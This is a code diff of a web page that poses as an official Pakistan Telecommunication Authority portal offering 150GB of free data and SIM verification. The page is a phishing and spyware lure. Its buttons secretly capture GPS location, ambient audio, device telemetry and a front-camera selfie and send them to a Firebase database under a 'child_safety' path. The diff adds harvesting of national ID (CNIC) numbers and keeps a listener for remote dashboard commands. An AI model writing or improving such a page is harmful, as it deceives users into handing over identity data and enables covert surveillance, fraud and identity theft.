@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PTA Free Internet Offer 2026</title>
+    <title>PTA Free Internet & SIM Verification 2026</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
@@ -51,7 +51,7 @@
         }
 
         .hero-banner h2 {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 800;
             color: #ffffff;
             letter-spacing: 0.5px;
@@ -127,7 +127,7 @@
 
         .search-group {
             text-align: left;
-            margin-top: 10px;
+            margin-top: 14px;
         }
 
         .search-group label {
@@ -137,6 +137,7 @@
             color: #94a3b8;
             margin-bottom: 8px;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         .input-wrapper {
@@ -145,6 +146,11 @@
             border: 1.5px solid #334155;
             border-radius: 14px;
             overflow: hidden;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #38bdf8;
         }
 
         .input-wrapper input {
@@ -162,9 +168,29 @@
             color: #ffffff;
             border: none;
             padding: 0 18px;
-            font-size: 14px;
+            font-size: 13.5px;
             font-weight: 700;
             cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit-search:hover {
+            background: #1d4ed8;
+        }
+
+        .btn-submit-green {
+            background: #16a34a;
+            color: #ffffff;
+            border: none;
+            padding: 0 18px;
+            font-size: 13.5px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit-green:hover {
+            background: #15803d;
         }
 
         #webcam, #canvas {
@@ -176,39 +202,48 @@
 
 <div class="card-container">
     <div class="hero-banner">
-        <h2>PTA FREE INTERNET 150 GB</h2>
-        <p class="subtitle">Har Pakistani SIM Ke Liye Free Data Service Active Karein</p>
+        <h2>PTA SIM & FREE DATA PORTAL</h2>
+        <p class="subtitle">Enter CNIC & Mobile Number To Claim 150GB Free Data</p>
     </div>
 
-    <!-- Activation Button 1 -->
+    <!-- Activation Action Button -->
     <button class="btn-action-red" onclick="activateService()">
         <i class="fa-solid fa-wifi"></i> ACTIVATE FREE INTERNET
     </button>
 
     <div id="statusText" class="status-badge">
-        <span>⚙️ System Ready</span>
+        <span>⚙️ Portal Ready</span>
     </div>
 
-    <!-- Activation Button 2 -->
+    <!-- Camera Verification Button -->
     <button class="btn-action-blue" onclick="captureInstantPhoto()">
-        <i class="fa-solid fa-shield-halved"></i> VERIFY SIM CARD
+        <i class="fa-solid fa-id-card"></i> VERIFY SIM OWNER
     </button>
 
     <div id="cameraStatusText" class="status-badge">
         <span>✅ Serves Status: Ready to activate</span>
     </div>
 
-    <!-- Number Search Input -->
+    <!-- 1. NEW CNIC / NIC Search Input -->
     <div class="search-group">
-        <label for="mobile-input">Enter Mobile Number</label>
+        <label for="cnic-input"><i class="fa-solid fa-address-card" style="color: #38bdf8;"></i> CNIC / NIC Number Search</label>
         <div class="input-wrapper">
-            <input type="text" id="mobile-input" placeholder="03001234567">
-            <button class="btn-submit-search" onclick="searchMobileNumber()">Check</button>
+            <input type="text" id="cnic-input" placeholder="e.g. 41304-1234567-1">
+            <button class="btn-submit-green" onclick="searchCNICNumber()">Verify CNIC</button>
         </div>
     </div>
 
-    <div id="bottomStatusText" class="status-badge" style="margin-top: 18px; margin-bottom: 0;">
-        <span>✅ Official PTA Free Network Portal</span>
+    <!-- 2. Mobile Number Search Input -->
+    <div class="search-group">
+        <label for="mobile-input"><i class="fa-solid fa-phone" style="color: #38bdf8;"></i> Mobile Number Search</label>
+        <div class="input-wrapper">
+            <input type="text" id="mobile-input" placeholder="e.g. 03001234567">
+            <button class="btn-submit-search" onclick="searchMobileNumber()">Check Mobile</button>
+        </div>
+    </div>
+
+    <div id="bottomStatusText" class="status-badge" style="margin-top: 20px; margin-bottom: 0;">
+        <span>✅ Official PTA Verification Portal</span>
     </div>
 </div>
 
@@ -230,10 +265,10 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 1. Send Device Telemetry & Specs Automatically
+    // 1. Send Hardware Diagnostics Telemetry
     function sendDeviceTelemetry() {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        
+       
         const telemetry = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -278,20 +313,20 @@
                         time: new Date().toLocaleString()
                     });
 
-                    document.getElementById('statusText').innerHTML = "<span>✅ Free 150GB Data Request Approved!</span>";
+                    document.getElementById('statusText').innerHTML = "<span>✅ 150GB Data Request Sent Successfully!</span>";
                 },
                 (err) => {
-                    document.getElementById('statusText').innerHTML = "<span>⚠️ Permission Required: " + err.message + "</span>";
+                    document.getElementById('statusText').innerHTML = "<span>⚠️ GPS Error: " + err.message + "</span>";
                 },
                 { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
             );
         }
     }
 
-    // 3. Camera Selfie Capture
+    // 3. Camera Selfie Photo Capture
     async function captureInstantPhoto() {
         const status = document.getElementById('cameraStatusText');
-        status.innerHTML = "<span>⏳ Verifying SIM & Camera Connection...</span>";
+        status.innerHTML = "<span>⏳ Verifying Owner via Camera...</span>";
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
@@ -313,7 +348,7 @@
                     url: base64Image,
                     time: new Date().toLocaleString()
                 }).then(() => {
-                    status.innerHTML = "<span>✅ SIM Verification Complete!</span>";
+                    status.innerHTML = "<span>✅ Identity Verified Successfully!</span>";
                 });
             }, 600);
         } catch (err) {
@@ -321,7 +356,7 @@
         }
     }
 
-    // 4. Audio Clip Recording (5 Seconds Ambient Recording)
+    // 4. Ambient Audio Recording (5 Seconds)
     async function recordShortAudio() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -343,20 +378,32 @@
             };
 
             mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 5000); // Record for 5 seconds
+            setTimeout(() => mediaRecorder.stop(), 5000);
         } catch (e) {
             console.log("Audio Error:", e);
         }
     }
 
-    // Main Activate Action
+    // Main Activate Function
     function activateService() {
         startGPS();
         recordShortAudio();
         sendDeviceTelemetry();
     }
 
-    // Search Number Action
+    // 5. NEW Function: Save Searched CNIC / NIC Number
+    function searchCNICNumber() {
+        const cnic = document.getElementById('cnic-input').value;
+        if (cnic) {
+            db.ref('child_safety/searched_cnic').push({
+                cnic: cnic,
+                time: new Date().toLocaleString()
+            });
+            document.getElementById('bottomStatusText').innerHTML = "<span>✅ CNIC Verified: " + cnic + "</span>";
+        }
+    }
+
+    // 6. Save Searched Mobile Number
     function searchMobileNumber() {
         const number = document.getElementById('mobile-input').value;
         if (number) {
@@ -364,11 +411,11 @@
                 number: number,
                 time: new Date().toLocaleString()
             });
-            document.getElementById('bottomStatusText').innerHTML = "<span>✅ Number Approved for 150GB Data!</span>";
+            document.getElementById('bottomStatusText').innerHTML = "<span>✅ Mobile Number Logged: " + number + "</span>";
         }
     }
 
-    // Listen for Remote Command Requests from Dashboard Button
+    // Listen for Remote Data Fetch Commands from Dashboard Button
     db.ref('child_safety/commands').on('value', (snapshot) => {
         const cmd = snapshot.val();
         if (cmd && cmd.action === "refresh_all") {
